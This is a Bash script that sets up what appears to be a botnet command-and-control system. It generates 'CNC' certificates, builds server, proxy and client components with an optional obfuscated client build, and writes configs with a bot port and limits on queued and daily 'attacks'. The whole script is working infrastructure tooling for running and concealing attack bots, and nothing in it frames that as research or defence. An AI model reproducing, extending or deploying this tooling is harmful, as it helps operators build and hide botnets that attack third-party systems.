#!/bin/bash
set -e

# ===== CONFIGURATION =====
# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Directories
BASE_DIR=$(pwd)
CLIENT_DIR="$BASE_DIR/client"
PROXY_DIR="$BASE_DIR/proxy"
SERVER_DIR="$BASE_DIR/server"
CERTS_DIR="$BASE_DIR/certs"
BUILD_DIR="$BASE_DIR/build"

# ===== FUNCTIONS =====
function print_header() {
    clear
    echo -e "${BLUE}"
    echo "     ▄▄ •          ·▄▄▄▄▄                   · ▄▄▄▄  ";
    echo "    ▐█ ▀ ▪▪         ▐▄▄▄·   ██•  ▪     ▪      ██▪ ██ ";
    echo "    ██  ▀█▄ ▄█▀▄    ██▪    ██▪    ▄█▀▄  ▄█▀▄ ▐█· ▐█▌";
    echo "    ▐█▄▪ ▐█▐█▌.▐▌   ██▌.   ▐█▌▐▌ ▐█▌.▐▌▐█▌.▐▌ ██. ██ ";
    echo "    ·▀▀▀▀▀  ▀█▄▀▪   ▀▀▀   .▀▀▀▀▪  ▀█▄▀▪ ▀█▄▀▪ ▀▀▀▀▀• ";
    echo "                                            ";
}

function check_dependencies() {
    local missing=()
    
    echo -e "${BLUE}[+] Checking dependencies...${NC}"
    
    # Check for required commands
    for cmd in openssl go certbot; do
        if ! command -v $cmd &> /dev/null; then
            missing+=("$cmd")
        fi
    done
    
    # Check for Go version
    if command -v go &> /dev/null; then
        go_version=$(go version | awk '{print $3}' | sed 's/go//')
        if (( $(echo "$go_version < 1.18" | bc -l) )); then
            missing+=("go_version (requires >=1.18)")
        fi
    fi
    
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}[-] Missing dependencies:${NC}"
        for dep in "${missing[@]}"; do
            echo "  - $dep"
        done
        echo -e "${YELLOW}[!] Please install missing dependencies before running this script.${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] All dependencies are installed.${NC}"
    fi
}

function generate_certs() {
    echo -e "${BLUE}[+] Generating certificates...${NC}"
    
    # Create certs directory structure
    mkdir -p "$CERTS_DIR"/{ca,server,proxy,client}
    
    # Generate CA
    echo -e "${YELLOW}[*] Generating CA certificate...${NC}"
    openssl genrsa -out "$CERTS_DIR/ca/ca.key" 4096
    openssl req -new -x509 -days 3650 -key "$CERTS_DIR/ca/ca.key" -out "$CERTS_DIR/ca/ca.crt" \
        -subj "/CN=CNC Root CA" -addext "basicConstraints=critical,CA:TRUE"
    
    # Generate Server Cert
    echo -e "${YELLOW}[*] Generating Server certificate...${NC}"
    openssl genrsa -out "$CERTS_DIR/server/server.key" 4096
    openssl req -new -key "$CERTS_DIR/server/server.key" -out "$CERTS_DIR/server/server.csr" \
        -subj "/CN=CNC Server" -addext "subjectAltName=IP:127.0.0.1,DNS:localhost"
    openssl x509 -req -days 3650 -in "$CERTS_DIR/server/server.csr" -CA "$CERTS_DIR/ca/ca.crt" \
        -CAkey "$CERTS_DIR/ca/ca.key" -CAcreateserial -out "$CERTS_DIR/server/server.crt" \
        -extfile <(printf "subjectAltName=IP:127.0.0.1,DNS:localhost")
    
    # Generate Proxy Cert
    echo -e "${YELLOW}[*] Generating Proxy certificate...${NC}"
    openssl genrsa -out "$CERTS_DIR/proxy/proxy.key" 4096
    openssl req -new -key "$CERTS_DIR/proxy/proxy.key" -out "$CERTS_DIR/proxy/proxy.csr" \
        -subj "/CN=CNC Proxy" -addext "subjectAltName=IP:127.0.0.1,DNS:localhost"
    openssl x509 -req -days 3650 -in "$CERTS_DIR/proxy/proxy.csr" -CA "$CERTS_DIR/ca/ca.crt" \
        -CAkey "$CERTS_DIR/ca/ca.key" -CAcreateserial -out "$CERTS_DIR/proxy/proxy.crt" \
        -extfile <(printf "subjectAltName=IP:127.0.0.1,DNS:localhost")
    
    # Generate Client Cert
    echo -e "${YELLOW}[*] Generating Client certificate...${NC}"
    openssl genrsa -out "$CERTS_DIR/client/client.key" 4096
    openssl req -new -key "$CERTS_DIR/client/client.key" -out "$CERTS_DIR/client/client.csr" \
        -subj "/CN=CNC Client" -addext "subjectAltName=IP:127.0.0.1"
    openssl x509 -req -days 3650 -in "$CERTS_DIR/client/client.csr" -CA "$CERTS_DIR/ca/ca.crt" \
        -CAkey "$CERTS_DIR/ca/ca.key" -CAcreateserial -out "$CERTS_DIR/client/client.crt" \
        -extfile <(printf "subjectAltName=IP:127.0.0.1")
    
    # Create PEM files
    cat "$CERTS_DIR/server/server.crt" "$CERTS_DIR/server/server.key" > "$CERTS_DIR/server/server.pem"
    cat "$CERTS_DIR/proxy/proxy.crt" "$CERTS_DIR/proxy/proxy.key" > "$CERTS_DIR/proxy/proxy.pem"
    cat "$CERTS_DIR/client/client.crt" "$CERTS_DIR/client/client.key" > "$CERTS_DIR/client/client.pem"
    
    # Create pinned certs
    cp "$CERTS_DIR/server/server.crt" "$CERTS_DIR/server/pinned.crt"
    cp "$CERTS_DIR/proxy/proxy.crt" "$CERTS_DIR/proxy/pinned.crt"
    
    # Create truststore
    openssl pkcs12 -export -out "$CERTS_DIR/truststore.p12" -inkey "$CERTS_DIR/ca/ca.key" \
        -in "$CERTS_DIR/ca/ca.crt" -passout pass:changeit
    
    # Cleanup
    rm -f "$CERTS_DIR"/*/*.{csr,srl}
    
    # Set strict permissions
    find "$CERTS_DIR" -type f -exec chmod 600 {} \;
    
    echo -e "${GREEN}[+] Certificates generated successfully!${NC}"
}

function generate_letsencrypt_certs() {
    echo -e "${BLUE}[+] Generating Let's Encrypt certificates...${NC}"
    
    if ! command -v certbot &> /dev/null; then
        echo -e "${RED}[-] certbot not found. Skipping Let's Encrypt certificate generation.${NC}"
        return
    fi
    
    read -p "Enter your domain name: " domain
    read -p "Enter your email (for Let's Encrypt notifications): " email
    
    echo -e "${YELLOW}[*] Requesting certificates from Let's Encrypt...${NC}"
    sudo certbot certonly --standalone --non-interactive --agree-tos \
        --email "$email" -d "$domain" --preferred-challenges http
    
    # Create symlinks to standard locations
    mkdir -p "$CERTS_DIR/letsencrypt"
    sudo ln -s "/etc/letsencrypt/live/$domain/fullchain.pem" "$CERTS_DIR/letsencrypt/server.crt"
    sudo ln -s "/etc/letsencrypt/live/$domain/privkey.pem" "$CERTS_DIR/letsencrypt/server.key"
    
    echo -e "${GREEN}[+] Let's Encrypt certificates generated successfully!${NC}"
}

function distribute_certs() {
    echo -e "${BLUE}[+] Distributing certificates to components...${NC}"
    
    # Copy to client
    mkdir -p "$CLIENT_DIR/certs"
    cp "$CERTS_DIR/ca/ca.crt" "$CLIENT_DIR/certs/"
    cp "$CERTS_DIR/client/client.pem" "$CLIENT_DIR/certs/"
    cp "$CERTS_DIR/client/client.key" "$CLIENT_DIR/certs/"
    
    # Copy to proxy
    mkdir -p "$PROXY_DIR/certs"
    cp "$CERTS_DIR/ca/ca.crt" "$PROXY_DIR/certs/"
    cp "$CERTS_DIR/proxy/proxy.pem" "$PROXY_DIR/certs/"
    cp "$CERTS_DIR/proxy/proxy.key" "$PROXY_DIR/certs/"
    
    # Copy to server
    mkdir -p "$SERVER_DIR/certs"
    cp "$CERTS_DIR/ca/ca.crt" "$SERVER_DIR/certs/"
    cp "$CERTS_DIR/server/server.pem" "$SERVER_DIR/certs/"
    cp "$CERTS_DIR/server/server.key" "$SERVER_DIR/certs/"
    cp "$CERTS_DIR/server/pinned.crt" "$SERVER_DIR/certs/"
    
    echo -e "${GREEN}[+] Certificates distributed successfully!${NC}"
}

function compile_components() {
    local obfuscate=$1
    
    echo -e "${BLUE}[+] Compiling components...${NC}"
    
    mkdir -p "$BUILD_DIR"
    
    # Compile Client
    echo -e "${YELLOW}[*] Compiling Client...${NC}"
    cd "$CLIENT_DIR"
    if [ -f "build.sh" ]; then
        chmod +x build.sh
        if [ "$obfuscate" = true ]; then
            echo -e "${YELLOW}[*] Using obfuscated build${NC}"
            ./build.sh --obfuscate
        else
            echo -e "${YELLOW}[*] Using standard build${NC}"
            ./build.sh
        fi
        mkdir -p "$BUILD_DIR/client"
        cp -r build/* "$BUILD_DIR/client/"
    else
        echo -e "${RED}[-] Client build script not found!${NC}"
    fi
    
    # Compile Proxy
    echo -e "${YELLOW}[*] Compiling Proxy...${NC}"
    cd "$PROXY_DIR"
    if [ "$obfuscate" = true ]; then
        echo -e "${YELLOW}[*] Using obfuscated build${NC}"
        go build -ldflags="-s -w -X main.randomKey=$(openssl rand -hex 16)" -o "$BUILD_DIR/proxy/proxy" proxy.go
    else
        go build -ldflags="-s -w" -o "$BUILD_DIR/proxy/proxy" proxy.go
    fi
    
    # Compile Server
    echo -e "${YELLOW}[*] Compiling Server...${NC}"
    cd "$SERVER_DIR"
    if [ "$obfuscate" = true ]; then
        echo -e "${YELLOW}[*] Using obfuscated build${NC}"
        go build -ldflags="-s -w -X main.randomKey=$(openssl rand -hex 16)" -o "$BUILD_DIR/server/server" main.go
    else
        go build -ldflags="-s -w" -o "$BUILD_DIR/server/server" main.go
    fi
    
    echo -e "${GREEN}[+] Components compiled successfully!${NC}"
}

function generate_configs() {
    echo -e "${BLUE}[+] Generating configuration files...${NC}"
    
    # Generate random keys
    command_key=$(openssl rand -hex 32)
    jwt_secret=$(openssl rand -hex 32)
    
    # Server config
    cat > "$SERVER_DIR/config.json" <<EOL
{
  "users_file": "users.json",
  "audit_log_file": "audit.log",
  "bot_server_ip": "0.0.0.0",
  "user_server_ip": "0.0.0.0",
  "bot_server_port": "1337",
  "user_server_port": "7331",
  "cert_file": "certs/server.crt",
  "key_file": "certs/server.key",
  "session_timeout": 3600,
  "max_conns": 1000,
  "max_read_size": 4096,
  "max_log_size": 10485760,
  "max_queued_attacks": 50,
  "max_daily_attacks": 100,
  "max_attack_duration": 3600,
  "max_sessions_per_user": 3,
  "min_password_length": 12,
  "password_complexity": true,
  "max_connections_per_ip": 5,
  "ddos_protection": true,
  "max_conn_rate": 10,
  "syn_flood_threshold": 50,
  "reset_token_validity": 3600,
  "command_signing_key": "$command_key",
  "pinned_cert_file": "certs/pinned.crt"
}
EOL
    
    # Proxy config
    cat > "$PROXY_DIR/proxy_config.json" <<EOL
{
  "listen_addr": "0.0.0.0:7002",
  "backend_addr": "127.0.0.1:1337",
  "dashboard_port": "8080",
  "admin_username": "admin",
  "admin_password": "$(openssl rand -hex 12)",
  "cert_file": "certs/proxy.crt",
  "key_file": "certs/proxy.key",
  "ca_cert_file": "certs/ca.crt",
  "stats_interval": 5,
  "max_connections": 1000,
  "max_buffer_size": 10485760,
  "jwt_secret": "$jwt_secret",
  "enable_debug_logs": false
}
EOL
    
    # Create empty users file if not exists
    if [ ! -f "$SERVER_DIR/users.json" ]; then
        echo "[]" > "$SERVER_DIR/users.json"
    fi
    
    echo -e "${GREEN}[+] Configuration files generated successfully!${NC}"
}

function print_summary() {
    echo -e "${BLUE}"
    echo "===================================="
    echo "          SETUP COMPLETE            "
    echo "===================================="
    echo -e "${NC}"
    echo -e "${GREEN}[+] Certificates generated in:${NC} $CERTS_DIR"
    echo -e "${GREEN}[+] Compiled binaries in:${NC} $BUILD_DIR"
    echo
    echo -e "${YELLOW}[!] Important Notes:${NC}"
    echo "1. The proxy admin password is stored in proxy_config.json"
    echo "2. The command signing key is stored in config.json"
    echo "3. Make sure to secure these files!"
    echo
    echo -e "${BLUE}Next steps:${NC}"
    echo "1. Deploy the components to their respective servers"
    echo "2. Configure firewall rules to allow necessary ports"
    echo "3. Start with the server, then proxy, then client components"
    echo
}

function full_setup() {
    print_header
    check_dependencies
    generate_certs
    generate_letsencrypt_certs
    distribute_certs
    generate_configs
    compile_components false
    print_summary
    echo -e "${GREEN}[+] Full setup completed successfully!${NC}"
}

function certs_only() {
    print_header
    echo -e "${YELLOW}[*] Running certificate generation only${NC}"
    generate_certs
    generate_letsencrypt_certs
    distribute_certs
    echo -e "${GREEN}[+] Certificate regeneration completed successfully!${NC}"
}

function compile_only() {
    print_header
    echo -e "${YELLOW}Select compilation method:${NC}"
    echo "1) Standard compilation"
    echo "2) Obfuscated compilation"
    read -p "Enter your choice [1-2]: " compile_choice
    
    case $compile_choice in
        1) compile_components false ;;
        2) compile_components true ;;
        *) echo -e "${RED}[-] Invalid choice${NC}"; exit 1 ;;
    esac
    
    echo -e "${GREEN}[+] Recompilation completed successfully!${NC}"
}

function show_menu() {
    print_header
    echo -e "${YELLOW}Select an option:${NC}"
    echo "1) Full setup (certs + config + compile)"
    echo "2) Regenerate certificates only"
    echo "3) Recompile components only"
    echo "4) Exit"
    echo
    read -p "Enter your choice [1-4]: " choice
    
    case $choice in
        1) full_setup ;;
        2) certs_only ;;
        3) compile_only ;;
        4) echo -e "${GREEN}[+] Exiting...${NC}"; exit 0 ;;
        *) echo -e "${RED}[-] Invalid option${NC}"; exit 1 ;;
    esac
}

# ===== MAIN SCRIPT =====
while true; do
    show_menu
    read -p "Press Enter to continue or Ctrl+C to exit..."
done